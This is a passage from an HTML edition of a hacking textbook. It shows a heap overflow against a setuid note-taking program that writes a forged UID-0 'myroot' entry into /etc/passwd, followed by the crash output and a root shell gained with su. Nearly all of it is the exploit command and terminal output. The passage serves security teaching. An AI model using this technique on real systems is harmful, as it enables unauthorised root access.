left;">be difficult to access this account and obtain root access, as the following output shows.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_463.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./notetaker $(perl -e &#39;print &quot;myroot:XXq2wKiyI43A2:0:0:&quot; . &quot;A&quot;x68 . &quot;:/root:/tmp/etc/passwd&quot;&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[DEBUG] buffer  @ 0x804a008: &#39;myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd&#39; [DEBUG] datafile @ 0x804a070: &#39;/etc/passwd&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] file descriptor is 3 Note has been saved.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">======= Backtrace: =========</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">./notetaker[0x8048916]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/lib/tls/i686/cmov/libc.so.6(<u> </u>libc_start_main+0xdc)[0xb7eafebc]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">./notetaker[0x8048511]</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">======= Memory map: ========</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">08048000-08049000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:0f</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">44384</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/cow/home/reader/booksrc/notetaker</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08049000-0804a000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">00:0f</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">44384</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/cow/home/reader/booksrc/notetaker</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0804a000-0806b000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0804a000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[heap]</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7d00000-b7d21000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7d00000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7d21000-b7e00000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">---p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7d21000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7e83000-b7e8e000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15444</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/libgcc_s.so.1</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7e8e000-b7e8f000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0000a000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15444</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/libgcc_s.so.1</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7e99000-b7e9a000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7e99000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7e9a000-b7fd5000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">15795</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/rofs/lib/tls/i686/cmov/libc-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7fd5000-b7fd6000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">r--p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0013b000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15795</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/tls/i686/cmov/libc-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7fd6000-b7fd8000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0013c000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15795</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/tls/i686/cmov/libc-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7fd8000-b7fdb000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7fd8000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7fe4000-b7fe7000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7fe4000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7fe7000-b8000000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15421</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/ld-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b8000000-b8002000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">00019000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15421</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/ld-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">bffeb000-c0000000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">bffeb000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[stack]</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ffffe000-fffff000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[vdso]</p></td></tr><tr style="height:10pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Aborted</p></td><td style="width:21pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:38pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:26pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:36pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ tail /etc/passwd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">avahi:x:105:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false cupsys:x:106:113::/home/cupsys:/bin/false</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">haldaemon:x:107:114:Hardware abstraction layer,,,:/home/haldaemon:/bin/false hplip:x:108:7:HPLIP system user,,,:/var/run/hplip:/bin/false gdm:x:109:118:Gnome Display Manager:/var/lib/gdm:/bin/false matrix:x:500:500:User Acct:/home/matrix:/bin/bash</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">jose:x:501:501:Jose Ronnick:/home/jose:/bin/bash reader:x:999:999:Hacker,,,:/home/reader:/bin/bash</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">? myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root:/tmp/etc/passwd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ su myroot Password: root@hacking:/home/reader/booksrc# whoami root</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root@hacking:/home/reader/booksrc#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_464.png"/></span></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part58.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part60.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
